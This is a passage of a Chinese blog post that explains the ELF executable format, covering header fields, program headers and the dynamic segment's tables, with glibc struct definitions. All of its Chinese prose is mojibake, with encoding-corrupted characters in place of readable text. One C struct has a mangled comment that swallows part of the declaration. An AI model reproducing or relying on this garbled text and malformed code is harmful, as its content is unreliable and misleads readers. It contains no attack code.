align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left">ET_NONE</td><td align="left">0</td><td align="left">æ— æ–‡ä»¶ç±»å‹</td></tr><tr><td align="left">ET_REL</td><td align="left">1</td><td align="left">å¯é‡å®šä½æ–‡ä»¶</td></tr><tr><td align="left">ET_EXEC</td><td align="left">2</td><td align="left">å¯æ‰§è¡Œæ–‡ä»¶</td></tr><tr><td align="left">ET_DYN</td><td align="left">3</td><td align="left">å…±äº«ç›®æ ‡æ–‡ä»¶</td></tr><tr><td align="left">ET_CORE</td><td align="left">4</td><td align="left">æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶</td></tr><tr><td align="left">ET_LOPROC</td><td align="left">0xff00</td><td align="left">å¤„ç†å™¨æŒ‡å®šä¸‹é™</td></tr><tr><td align="left">ET_HIPROC</td><td align="left">0xffff</td><td align="left">å¤„ç†å™¨æŒ‡å®šä¸Šé™</td></tr></tbody></table><p>è¿™é‡Œlså¤´éƒ¨ä¿¡æ¯ä¸­çš„ç±»å‹ç«Ÿç„¶æ˜¯å…±äº«åº“æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬æŸ¥çœ‹çš„æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°å¼€å¯pieçš„ç¨‹åºéƒ½ä¼šè¢«è¯†åˆ«ä¸º3</p><p><code>PIE</code>èƒ½ä½¿ç¨‹åºåƒå…±äº«åº“ä¸€æ ·åœ¨ä¸»å­˜ä»»ä½•ä½ç½®è£…è½½ï¼Œè¿™éœ€è¦å°†ç¨‹åºç¼–è¯‘æˆä½ç½®æ— å…³ï¼Œå¹¶é“¾æ¥ä¸º<code>ELF</code>å…±äº«å¯¹è±¡ã€‚</p><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>å¯è¿è¡Œçš„æœºå™¨æ¶æ„</p><p>ä¸èƒ½éšæ„ä¿®æ”¹</p><table><thead><tr><th align="left">åç§°</th><th align="left">å€¼</th><th align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left">EM_NONE</td><td align="left">0</td><td align="left">æ— æœºå™¨ç±»å‹</td></tr><tr><td align="left">EM_M32</td><td align="left">1</td><td align="left">AT&amp;T WE 32100</td></tr><tr><td align="left">EM_SPARC</td><td align="left">2</td><td align="left">SPARC</td></tr><tr><td align="left">EM_386</td><td align="left">3</td><td align="left">Intel 80386</td></tr><tr><td align="left">EM_68K</td><td align="left">4</td><td align="left">Motorola 68000</td></tr><tr><td align="left">EM_88K</td><td align="left">5</td><td align="left">Motorola 88000</td></tr><tr><td align="left">EM_860</td><td align="left">7</td><td align="left">Intel 80860</td></tr><tr><td align="left">EM_MIPS</td><td align="left">8</td><td align="left">MIPS RS3000</td></tr></tbody></table><h3 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h3><p>å¯ä¿®æ”¹</p><p>ç³»ç»Ÿç‰ˆæœ¬</p><h3 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h3><p>ä¸å¯ä¿®æ”¹</p><p>ç³»ç»Ÿè½¬äº¤æ§åˆ¶æƒç»™ ELF ä¸­ç›¸åº”ä»£ç çš„è™šæ‹Ÿåœ°å€,ä¹Ÿå°±æ˜¯ç»™pcçš„å€¼ï¼Œå¾ˆé‡è¦ ,å¯ä»¥åšå…¥å£ç‚¹hook</p><h3 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h3><p>ä¸å¯ä¿®æ”¹</p><p>Program Header table OFFset</p><p>ç¨‹åºå¤´éƒ¨è¡¨åœ¨elfä¸­çš„åç§»</p><h3 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h3><p>å¯ä¿®æ”¹</p><p>Section Header table OFFset</p><p>èŠ‚å¤´è¡¨åœ¨elfä¸­åç§»</p><h3 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h3><p>å¯ä¿®æ”¹</p><p>å…·ä½“æ¶æ„ç‰ˆæœ¬</p><h3 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h3><p>å¯ä¿®æ”¹</p><p>ELF HEADER é•¿åº¦</p><h3 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h3><p>ä¸å¯ä¿®æ”¹</p><p>Program Header ENTry SIZE</p><p>program header tableæ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œå‚æ•°æè¿°ç»“æ„ä½“å¤§å°</p><h3 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h3><p>ä¸å¯ä¿®æ”¹</p><p>Program Header entry NUMber</p><p>program header tableç»“æ„ä½“ä¸ªæ•°</p><h3 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h3><p>å¯ä¿®æ”¹</p><p>Section Header ENTry SIZE</p><p>sectionç»“æ„ä½“å¤§å°</p><h3 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h3><p>å¯ä¿®æ”¹</p><p>Section Header NUMber</p><p>sectionç»“æ„ä½“ä¸ªæ•°</p><h3 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h3><p>å¯ä¿®æ”¹</p><p><strong>å…³äºProgram Header table çš„é¡¹åŸºæœ¬éƒ½ä¸å¯ä»¥æ”¹ï¼ŒSection Header TableåŸºæœ¬å¯æ”¹ï¼Œä¸å½±å“æ‰§è¡Œ</strong></p><h2 id="Program-Header-table"><a href="#Program-Header-table" class="headerlink" title="Program Header table"></a>Program Header table</h2><p><strong>ç¨‹åºçš„å¤´éƒ¨åªæœ‰å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æœ‰æ„ä¹‰ã€‚</strong></p><ul><li>ç¨‹åºå¤´è¡¨&#x2F;æ®µè¡¨ï¼ˆProgram header tableï¼‰<ul><li>å‘Šè¯‰ç³»ç»Ÿå¦‚ä½•åˆ›å»ºè¿›ç¨‹</li><li>ç”Ÿæˆè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶å¿…é¡»æ‹¥æœ‰æ­¤ç»“æ„</li><li>é‡å®šä½æ–‡ä»¶ä¸ä¸€å®šéœ€è¦</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    p_type;<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word    p_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off    p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr    p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr    p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword    p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword    p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword    p_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="p-type"><a href="#p-type" class="headerlink" title="p_type"></a>p_type</h3><p>PT_LOAD  1  æ­¤ç±»å‹æ®µä¸ºä¸€ä¸ªå¯åŠ è½½çš„æ®µï¼Œå¤§å°ç”± p_filesz å’Œ p_memsz æè¿°ã€‚æ–‡ä»¶ä¸­çš„å­—èŠ‚è¢«æ˜ å°„åˆ°ç›¸åº”å†…å­˜æ®µå¼€å§‹å¤„ã€‚å¦‚æœ p_memsz å¤§äº p_fileszï¼Œâ€œå‰©ä½™â€ çš„å­—èŠ‚éƒ½è¦è¢«ç½®ä¸º 0ã€‚p_filesz ä¸èƒ½å¤§äº p_memszã€‚å¯åŠ è½½çš„æ®µåœ¨ç¨‹åºå¤´éƒ¨ä¸­æŒ‰ç…§ p_vaddr çš„å‡åºæ’åˆ—ã€‚</p><p>PT_GNU_RELRO ç”¨äºæŒ‡ç¤º GNU ld linker é“¾æ¥å™¨å¦‚ä½•å°†æŸäº›æ®µæ”¾ç½®åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ä¸­ä»¥å®ç°åœ°å€ç©ºé—´çš„ä¿æŠ¤ã€‚<code>PT_GNU_RELRO</code> ä¸­çš„ <code>RELRO</code> æ˜¯ â€œRELocation Read-Onlyâ€ çš„ç¼©å†™ã€‚å®ƒæŒ‡å®šäº†ä¸€ä¸ªåŒºæ®µï¼Œè¯¥åŒºæ®µåŒ…å«äº†ç¨‹åºçš„åªè¯»æ•°æ®æ®µ (å¦‚ .rodata) ä¸­æ‰€æœ‰çš„å…¨å±€åç§»è¡¨ (Global Offset Tableï¼Œç®€ç§° GOT) å’Œé‡å®šä½è¡¨ (Relocation Table)ï¼Œå¹¶å°†è¿™ä¸ªåŒºæ®µè®¾ç½®ä¸ºåªè¯»ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯é˜²æ­¢ç¨‹åºåœ¨è¿è¡Œæ—¶è¢«æ”»å‡»è€…åˆ©ç”¨ GOT ç¯¡æ”¹ï¼Œæé«˜ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p><p>æˆ‘ä»¬åªå…³æ³¨ä¸€ä¸‹éœ€è¦åŠ è½½åˆ°å†…å­˜çš„æ®µå°±å¯ä»¥ </p><h3 id="ä»¥ls-program-head-table-ä¸ºä¾‹åˆ†æ"><a href="#ä»¥ls-program-head-table-ä¸ºä¾‹åˆ†æ" class="headerlink" title="ä»¥ls program head table ä¸ºä¾‹åˆ†æ"></a>ä»¥ls program head table ä¸ºä¾‹åˆ†æ</h3><p><img src="/2023/03/19/23-2-21-elf/image-20230223004348967.png" alt="image-20230223004348967"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ®µéœ€è¦åŠ è½½åˆ°å†…å­˜çš„å¯åŠ è½½æ®µï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªæ®µ(&#x3D;&#x3D;é™æ€é“¾æ¥ä¸éœ€è¦&#x3D;&#x3D;)ï¼Œä¸€ä¸ªæ˜¯Program Header å¦ä¸€ä¸ªæ˜¯ Interpreter Path(è§£é‡Šå™¨è·¯å¾„)</p><ul><li><p>Program Header</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223163500827.png" alt="image-20230223163500827"></p><p>å¯¹ç¨‹åºåŠ è½½åˆæœ‰çš„åªæœ‰p_offset_FROM_FILE_BEGINå’Œp_vaddr_virtual_addreesè¿™ä¸¤ä¸ªå€¼åˆå¿…é¡»å’ŒELF Headeré‡Œçš„e_phoffä¸€æ ·ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†åœ¨è§£æelfæ—¶å¦‚æœç»™çš„æ–‡ä»¶æŒ‡é’ˆæ˜¯program header tableåœ°å€ï¼Œè€Œåˆéœ€è¦elf headeræ—¶(æ¯”å¦‚éœ€è¦ç¨‹åºå…¥å£ç‚¹)ï¼Œå°†è¯¥æŒ‡é’ˆå‡å»è¿™ä¸ªoffsetå°±å¯ä»¥æ‰¾åˆ°elf headerï¼Œæ¯•ç«Ÿåªæœ‰elf headerä½ç½®å›ºå®šåœ¨æ–‡ä»¶å¼€å¤´</p></li><li><p>Interpreter Path</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223165238248.png" alt="image-20230223165238248"></p><p>è¡¨ç¤ºåœ¨æ–‡ä»¶åç§»offset ä¸º0x318çš„ä½ç½®è¯»å–LENGTHä¸º28å­—èŠ‚çš„è§£é‡Šå™¨åœ°å€ï¼Œæ¥åŠ è½½ä¸‹é¢çš„loadableæ®µåˆ°è¿›ç¨‹å†…å­˜</p><p><code>/lib64/ld-linux-x86-64.so.2</code> æ˜¯ Linux x86-64 ç³»ç»Ÿä¸‹çš„åŠ¨æ€é“¾æ¥å™¨ï¼ˆdynamic linkerï¼‰æ–‡ä»¶ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå°†ç¨‹åºæ‰€éœ€çš„å…±äº«åº“ï¼ˆshared libraryï¼‰åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†è¿™äº›å…±äº«åº“ä¸­æœªå®šä¹‰çš„ç¬¦å·ä¸ç¨‹åºä¸­å®šä¹‰çš„ç¬¦å·è¿›è¡Œé“¾æ¥ï¼Œä»è€Œä½¿ç¨‹åºèƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œã€‚</p></li><li><p>Loadable segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230309185924942.png" alt="image-20230309185924942"></p><p>åˆ©ç”¨mmapå‘pie+virtual_addresså¤„æ˜ å°„ä»file_beginå¼€å§‹raw_lengthå¤§å°çš„æ•°æ®ï¼Œå‰é¢æ˜ å°„å¿…é¡»ä»é¡µå¯¹é½å¼€å§‹ï¼Œåé¢å¿…é¡»æŒ‰4096å¯¹é½(é¡µå¯¹é½)ç»“æŸ</p></li><li><p>Dynamic segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318221408017.png" alt="image-20230318221408017"></p><p>è¿™é‡Œé¢ä¿å­˜äº†åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚ä¾èµ–äºå“ªäº›å…±äº«å¯¹è±¡ã€åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨çš„ä½ç½®ã€å…±äº«å¯¹è±¡åˆå§‹åŒ–ä»£ç çš„åœ°å€ç­‰</p><p>ä»è¿™é‡Œå¼€å§‹æˆ‘ä»¬å·²ç»æŠŠç£ç›˜ä¸Šçš„æ–‡ä»¶åŠ è½½åˆ°äº†å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸ä¼šå†ç”¨åˆ°è¿™é‡Œçš„ä»»ä½•å’Œæ–‡ä»¶ç›¸å…³çš„åœ°å€</p><p>è¿™ä¸ªæ®µæ ‡è®°çš„æ•°æ®ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *64ä½ç¨‹åºå 8bit ç”¨äºåŒºåˆ†å„ç§æŒ‡å®šä¿¡æ¯ç±»å‹çš„æ ‡è®°ï¼Œè¯¥ç»“æ„ä¸­çš„å…±ç”¨ä½“æ ¹æ®è¯¥æ ‡å¿—è¿›è¡Œè§£é‡Š/</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span>ä½ç¨‹åºå <span class="number">8b</span>it æˆ–è€…ä¿å­˜ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œæˆ–è€…ä¿å­˜ä¸€ä¸ªæ•´æ•°ï¼Œå¯ä»¥æ ¹æ®ç‰¹å®šçš„æ ‡å¿—è¿›è¡Œè§£é‡Šã€‚</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL        0<span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED    1<span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ    2<span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT    3<span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH        4<span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB    5<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB    6<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA        7<span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ    8<span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT    9<span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ    10<span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT    11<span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME    14<span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH    15<span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC    16<span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL        17<span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ    18<span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT    19<span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL    20<span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEBUG    21<span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TEXTREL    22<span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_JMPREL    23<span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_BIND_NOW24<span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RUNPATH    29<span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FLAGS    30<span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ENCODING    32<span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAY 32        <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAYSZ 33        <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB_SHNDX    34<span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_NUM35<span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOOS        0x6000000d<span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIOS        0x6ffff000<span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOPROC    0x70000000<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIPROC    0x7fffffff<span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PROCNUMDT_MIPS_NUM<span class="comment">/* Most used by any processor */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGLO    0x6ffffe00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_HASH    0x6ffffef5<span class="comment">/* GNU-style hash table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_PLT    0x6ffffef6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_GOT    0x6ffffef7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_CONFLICT    0x6ffffef8<span class="comment">/* Start of conflict section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_LIBLIST    0x6ffffef9<span class="comment">/* Library list */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_CONFIG    0x6ffffefa<span class="comment">/* Configuration information.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEPAUDIT    0x6ffffefb<span class="comment">/* Dependency auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_AUDIT    0x6ffffefc<span class="comment">/* Object auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PLTPAD0x6ffffefd<span class="comment">/* PLT padding.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_MOVETAB0x6ffffefe<span class="comment">/* Move table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMINFO    0x6ffffeff<span class="comment">/* Syminfo table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGHI    0x6ffffeff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRTAGIDX(tag)    (DT_ADDRRNGHI - (tag))<span class="comment">/* Reverse order! */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRNUM 11</span></span><br></pre></td></tr></table></figure><ul><li><p>å­—ç¬¦ä¸²è¡¨åœ°å€d_tag&#x3D;5çš„åœ°å€ï¼Œåé¢å…«ä½å°±æ˜¯åœ°å€ï¼Œå…¶å®sectioné‡Œçš„.dynsträ¹Ÿèƒ½æ‰¾åˆ°ï¼Œä½†æ˜¯ä¸ä¸€å®šå‡†ç¡®ï¼Œå› ä¸ºæˆ‘ä»¬ç¨‹åºåŠ è½½æ‰§è¡Œæ—¶é‚£ä¸ªsetionæ— ç”¨</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318230730833.png" alt="image-20230318230730833"></p><p><img src="/2023/03/19/23-2-21-elf/image-20230817101327570.png" alt="image-20230817101327570"></p></li><li><p>å¯¼å…¥åº“è¡¨d_tag&#x3D;1 åé¢æ—¶å­—ç¬¦ä¸²è¡¨çš„åç§»ï¼Œå¯èƒ½ä¸æ­¢ä¸€ä¸ªå¯¼å…¥åº“è¡¨</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231041729.png" alt="image-20230318231041729"></p><p>0x1040+0x0542&#x3D;0x1582 0x1040+0x0552&#x3D;0x1592</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231247771.png" alt="image-20230318231247771"></p></li><li><p>ç¬¦å·è¡¨ d_tag&#x3D;6 å¯¹åº”section .dynsym</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318232353517.png" alt="image-20230318232353517"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;<span class="number">4</span><span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="number">1</span><span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;    <span class="number">1</span><span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section    st_shndx;<span class="number">2</span><span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;<span class="number">8</span><span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword    st_size;<span class="number">8</span><span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;                <span class="number">24</span></span><br></pre></td></tr></table></figure></li><li><p>å¯¼å…¥è¡¨ d_tag&#x3D;23&#x3D;0x17</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004444739.png" alt="image-20230319004444739"></p><p>å¯¼å…¥è¡¨çš„sizeåœ¨d_tag&#x3D;2å¤„</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004959046.png" alt="image-20230319004959046"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;<span class="number">8</span><span class="comment">/* Address */</span>ï¼Œå†™å…¥å¯¼å…¥åœ°å€ï¼Œä¹Ÿå°±æ˜¯gotè¡¨</span><br><span class="line">  Elf64_Xword    r_info;<span class="number">8</span><span class="comment">/* Relocation type and symbol index */</span>å‰<span class="number">32</span>ä½å­˜å‚¨ç€é‡å®šä½ç±»å‹ä¿¡æ¯ï¼Œå<span class="number">32</span>ä½å­˜å‚¨ç€ç¬¦å·è¡¨ç´¢å¼•ä»<span class="number">1</span>å¼€å§‹</span><br><span class="line">  Elf64_Sxword    r_addend;<span class="number">8</span><span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>é€‰å–ä¸€ä¸ªåˆ†æ</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014528225.png" alt="image-20230319014528225"></p><p>ç¬¦å·è¡¨</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014737236.png" alt="image-20230319014737236"></p><p>å­—ç¬¦ä¸²è¡¨0x1040+0x344&#x3D;1384</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014926764.png" alt="image-20230319014926764"></p><p>ida</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319015029874.png" alt="image-20230319015029874"></p></li><li><p>é‡å®šä½è¡¨ d_tag&#x3D;7 sizeåœ¨d_tag&#x3D;8</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319123925728.png" alt="image-20230319123925728"></p><p>ç»“æ„å’Œå¯¼å…¥è¡¨ä¸€æ ·</p></li><li><p>å“ˆå¸Œè¡¨ #define DT_GNU_HASH0x6ffffef5&#x2F;* GNU-style hash table.  *&#x2F;</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319134353748.png" alt="image-20230319134353748"></p><p>ç”¨äºåŠ é€Ÿç¬¦å·æŸ¥æ‰¾ï¼Œåœ¨ DT_GNU_HASH ä¸­ï¼Œç¬¦å·åç§°è¢«å“ˆå¸Œåˆ°ä¸€ä¸ªæ¡¶ä¸­ï¼Œæ¯ä¸ªæ¡¶ä¸­ä¿å­˜äº†ä¸€ä¸ªæŒ‡å‘ç¬¦å·è¡¨çš„æŒ‡é’ˆã€‚å½“éœ€è¦æŸ¥æ‰¾ç¬¦å·æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨å¯ä»¥ä½¿ç”¨å“ˆå¸Œè¡¨æ¥å¿«é€Ÿå®šä½ç¬¦å·çš„ä½ç½®ï¼Œè€Œä¸éœ€è¦éå†æ•´ä¸ªç¬¦å·è¡¨ã€‚</p></li></ul></li><li><p>Read-only After Relocation</p><p>åŠ è½½åˆ°å†…å­˜é‡å®šä½åæœ€åä¸€ä¸ªsegmentè¿˜ä¼šæŒ‡å¯¼è¿›è¡Œåªè¯»æ”¹å†™<img src="/2023/03/19/23-2-21-elf/image-20230223005339928.png" alt="image-20230223005339928"></p></li></ul><p>â€‹ä»0x232b0å¼€å§‹memsz 3208ä¸ªbyteä¸ºåªè¯»</p><h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><ul><li>èŠ‚å¤´è¡¨ï¼ˆSection header tableï¼‰<ul><li>è®°å½•äº†ELFæ–‡ä»¶çš„èŠ‚åŒºä¿¡æ¯</li><li>ç”¨äºé“¾æ¥çš„ç›®æ ‡æ–‡ä»¶å¿…é¡»æ‹¥æœ‰æ­¤ç»“æ„</li><li>å…¶å®ƒç±»å‹ç›®æ ‡æ–‡ä»¶ä¸ä¸€å®šéœ€è¦</li></ul></li></ul><p>section Header 